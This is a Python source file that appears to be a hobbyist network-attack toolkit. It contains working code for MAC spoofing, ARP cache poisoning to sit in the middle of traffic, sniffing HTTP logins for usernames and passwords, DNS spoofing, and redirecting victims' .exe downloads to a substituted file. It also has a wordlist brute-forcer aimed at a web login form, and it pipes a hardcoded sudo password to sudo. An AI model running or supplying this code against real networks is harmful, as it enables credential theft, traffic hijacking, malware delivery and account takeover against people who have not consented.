import subprocess
import re
import scapy.all as scapy
import os
from threading import Thread
import time
# from scapy.layers import http
import netfilterqueue
import requests


def current_mac(interface):
    try:
        ifconfig_result = subprocess.check_output(["ifconfig", interface]).decode()
        mac_address_search_result = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", ifconfig_result)
        if not mac_address_search_result:
            return False
        else:
            return(mac_address_search_result.group(0))
    except Exception as e:
        return False



def change_mac( interface, mac):
    password='kali'
    cmd='ls'
    
    subprocess.check_output('echo {} | sudo -S {}'.format(password, cmd), shell=True)

    current_mac_address = current_mac(interface)

    result = []

    if current_mac_address:
        result.append("Your Current MAC Address For " + interface + " Is: " + current_mac_address)
        result.append("Changing MAC Address For " + interface + " To " + mac + "...")
        subprocess.call(["sudo","ifconfig", interface ,"down"])
        try:
            subprocess.check_output(["sudo","ifconfig", interface ,"hw","ether", mac])
        except Exception as e:
            return False
        subprocess.call(["sudo","ifconfig", interface ,"up"])
        new_mac = current_mac(interface)

        if new_mac:
            if new_mac.lower() == mac.lower():
                result.append("Changed Successfully Too " + mac)
                return result
        else:
            return False
        
    else:
        return False



def scan(ip):
    # password='kali'
    # cmd='ls'
    
    # subprocess.check_output('echo {} | sudo -S {}'.format(password, cmd), shell=True)


    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    clients_list = []

    for element in answered:
        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        clients_list.append(client_dict)
    
    return clients_list

    

def print_scan_results(results_list):
    print("\nIP\t\t\t MAC Address\n")
    for client in results_list:
        print(client["ip"] + "\t\t" + client["mac"])


def get_mac(ip):
    
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    
    return answered[0][1].hwsrc 
 

def enable_port_forwarding():
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')


       
class ArpSpoofTask: 
      
    def __init__(self): 
        self.arp_spoof_running = True
        self.thread_started = False


    def arp_spoof(self, target_ip, spoof_ip):
        target_mac = get_mac(target_ip)
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        # It will associate false ip(router's ip/Gateway ip) with hacker's mac address
        scapy.send(packet)
        return packet.summary()


    def restore(self, destination_ip, source_ip):
        try:
            if not self.thread_started:
                return False

            self.terminate()
            results = []
            destination_mac = get_mac(destination_ip)
            source_mac = get_mac(source_ip)
            packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip , hwsrc=source_mac) 
            scapy.send(packet, count=4)
            results.append(packet.summary())
            return results
        except Exception as e:
            return False


    def launch_arp_spoof(self, ip1, ip2):
        results = []
        try:
            results.append(self.arp_spoof(ip1, ip2))
            results.append(self.arp_spoof(ip2, ip1))
            enable_port_forwarding()
            results.append("Port forwarding enabled...")
            return results
        except Exception as e:
            return False
            
      
    def terminate(self): 
        print("Terminating...")
        self.arp_spoof_running  = False
        self.thread_started = False

        
    def run(self, ip1, ip2): 
        while self.arp_spoof_running: 
            print("Sending...")
            
            try:
                self.arp_spoof(ip1, ip2)
                self.arp_spoof(ip2, ip1)
            except Exception as e:
                print("ARP Spoofing Issue")
            time.sleep(2) 


    def continue_arp_spoof(self, ip1, ip2):
        self.arp_spoof_running = True
        self.thread_started = True
        t = Thread(target = self.run, args =(ip1, ip2))
        t.start()


class PacketSniffer:

    def __init__(self):
        self.sniff_started = False
        self.results = []

   
    def sniff(self, interface):
        scapy.sniff(iface=interface, store=False, prn = self.process_sniffed_packet) 
        #prn -> specify a callback everytime when a function is called

    def get_url(self, packet):
        from scapy.layers import http
        return "http://" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
    
    def get_credentials(self, packet):
        if(packet.haslayer(scapy.Raw)):
            load = packet[scapy.Raw]
            keywords = ["username","email","uname", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in str(load):
                    login = str(load).replace("b'", "")
                    return login[:-1]


    def process_sniffed_packet(self, packet):
        from scapy.layers import http
        if packet.haslayer(http.HTTPRequest):
            print("YES")
            url = self.get_url(packet)
            
            print(url)
            login_info = self.get_credentials(packet)
            if login_info:
                print(login_info)
                self.results.append({'url':url, 'credentials': login_info})
            else:
                self.results.append({'url':url, 'credentials':'Not Found'})
        

    def run(self, interface): 
        while self.sniff_started: 
            print("Sniffing...")
            self.sniff(interface)
            print("Sniffing Stopped")
            time.sleep(2) 
            

    def continue_packet_sniff(self, interface):

        if not self.sniff_started:
            self.sniff_started = True
            t = Thread(target = self.run,  args =(interface, ))
            t.start()
        else:
            return "running"
       
        

    def terminate(self):
       
        print("Terminating")
        self.sniff_started = False


# interface = "eth0"
# new_mac = "EC:69:F9:82:88:A2"


# if change_mac(interface, new_mac):
#     print("Changed")
# else:
#     print("Not Changed")

# results = scan("10.0.2.1/24")
# print_scan_results(results)

# arp_spoof("10.0.2.29", "10.0.2.1")
# arp_spoof("10.0.2.1", "10.0.2.29")
# enable_port_forwarding()

# results = launch_arp_spoof("10.0.2.29", "10.0.2.1")

# if(results):
#     print("Attacked Successfully")
#     print(results)
# else:
#     print("Attack was not Successful")

# result = restore("10.0.2.29", "10.0.2.1")

# if(result):
#     print("Restored Successfully")
# else:
#     print("NOt")


# obj = ArpSpoofTask() 
# obj.launch_arp_spoof("10.0.2.29", "10.0.2.1")
# obj.continue_arp_spoof()

# obj = PacketSniffer()
# obj.continue_packet_sniff()

# print("Hello...")
# print("Hello here...")
# print("Hi...")

class DnsSpoof:
    def __init__(self):
        self.accept_packet = True
        self.url = ''
        self.spoofed_ip = ''

    # 176.28.50.165

    def set_forward_chain(self):
        os.system("iptables --flush")
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")


    def set_params(self, url, spoofed_ip):
        self.url = url
        self.spoofed_ip = spoofed_ip


    def process_packet(self, packet):
        scapy_packet = scapy.IP(packet.get_payload())
        
        if scapy_packet.haslayer(scapy.DNSRR):
            qname = scapy_packet[scapy.DNSQR].qname
            print(qname.decode() + "here...")
            
            if self.url:
                if self.url in qname.decode():
                    print("Spoofing Target...")
                    answer = scapy.DNSRR(rrname=qname, rdata=self.spoofed_ip)
                    scapy_packet[scapy.DNS].an = answer
                    scapy_packet[scapy.DNS].ancount = 1

                    del scapy_packet[scapy.IP].len
                    del scapy_packet[scapy.IP].chksum
                    del scapy_packet[scapy.UDP].len
                    del scapy_packet[scapy.UDP].chksum

                    packet.set_payload(bytes(scapy_packet))

        if self.accept_packet: 
            packet.accept()
        else:
            packet.drop()

    
    def is_connected(self):
        return self.accept_packet


    def drop_connection(self):
        self.accept_packet = False

    
    def establish_connection(self):
        self.accept_packet = True


    def restore(self):
        self.set_params('abc', '')
    
    def run(self):
        print("Queue running...")
        time.sleep(2)
        try:
            queue = netfilterqueue.NetfilterQueue()
            queue.bind(0, self.process_packet)
            queue.run()
        except Exception as e:
            raise Exception("Queue error")


    def bind(self):
        t = Thread(target = self.run)
        t.start()
        

# obj = ArpSpoofTask() 
# if obj.launch_arp_spoof("10.0.2.29", "10.0.2.1"):
#     obj.continue_arp_spoof("10.0.2.29", "10.0.2.1")
# else:
#     print("Could not reach here")

# dns_spoof = DnsSpoof()
# dns_spoof.bind()




class Interceptor:

    def __init__(self):
        self.ack_list=[]

    def set_file(self, file):
        self.file = file

    

    def enable_forward_chain(self):
        subprocess.call(["iptables", "--flush"])
        subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])


    def process_packet(self, packet):
        scapy_packet=scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.Raw):
            if scapy_packet[scapy.TCP].dport == 80:
                # scapy_packet.show()
                first = ".exe" in scapy_packet[scapy.Raw].load.decode()
                second = "evil.exe" not in scapy_packet[scapy.Raw].load.decode()
                if first and second:
                    self.ack_list.append(scapy_packet[scapy.TCP].ack)
                    print("[+] .exe requested")
                    print("[+] Intercepting File..")
            elif scapy_packet[scapy.TCP].sport == 80:
                if scapy_packet[scapy.TCP].seq in self.ack_list:
                    self.ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("REDIRECTIING TO " + self.file)
                    scapy_packet[scapy.Raw].load="HTTP/1.1 301 Moved Permanently\nLocation: http://"+ self.file +"\n\n"
                    print("[+]Redirecting file")
                    # scapy_packet.show()
                    del scapy_packet[scapy.IP].chksum
                    del scapy_packet[scapy.IP].len
                    del scapy_packet[scapy.TCP].chksum
                    packet.set_payload(bytes(scapy_packet))
                    # packet.payload = scapy_packet.payload

        packet.accept()


    def run(self):
        print("File Queue running...")
        time.sleep(2)
        try:
            queue = netfilterqueue.NetfilterQueue()
            queue.bind(0, self.process_packet)
            queue.run()
        except Exception as e:
            raise Exception("Queue error")


    def bind(self):
        t = Thread(target = self.run)
        t.start()


# obj = PacketSniffer()
# obj.continue_packet_sniff("eth0")
    
# obj = PacketSniffer()
    
# interceptor = Interceptor()
# interceptor.enable_forward_chain()
# interceptor.bind()

def brute_force_attack(target_url, username_field, pass_field, value1, submit_field):
    
    data_dict = {username_field:value1,submit_field:"submit"}

    with open("password.lst","r") as wordlist_file:
        for line in wordlist_file:
            word = line.strip()
            data_dict[pass_field] = word
            response = requests.post(target_url, data=data_dict)
            if "failed" not in response.content.decode():
                return word

    return False
    


# attack = brute_force_attack("http://theridaarif.com/login.php", "username", "password", "admin", "login")


# if(attack):
#     print("Success..\n Password--->" + attack);
